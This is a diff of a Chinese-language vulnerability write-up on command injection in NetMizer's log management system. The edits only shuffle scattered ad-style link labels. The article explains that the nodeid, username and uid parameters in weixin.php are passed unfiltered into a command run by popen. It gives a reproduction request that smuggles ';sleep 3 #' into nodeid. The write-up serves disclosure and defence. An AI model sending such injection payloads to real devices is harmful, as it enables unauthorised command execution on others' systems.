@@ -20,14 +20,6 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
 
 # 漏洞分析
 
-深入探索
-
-防火墙软件
-
-安全监控系统
-
-在线工具箱
-
 看下 `weixin.php` 业务实现关键逻辑部分
 
 ```
@@ -89,13 +81,21 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
        }
 ```
 
+深入探索
+
+商务软件和生产力软件
+
+网络设备
+
+客户关系管理
+
 多个用户可控且无过滤和校验的参数如 nodeid、username、uid 直接拼接进cmd命令中，然后使用popen执行命令，造成[命令注入](https://mrxn.net/tag/rce)漏洞。
 
 # 漏洞复现
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-漏洞扫描服务
+软件
 
 ```
 GET /data/search/weixin.php?action=file&nodeid=;sleep+3+%23+ HTTP/1.1
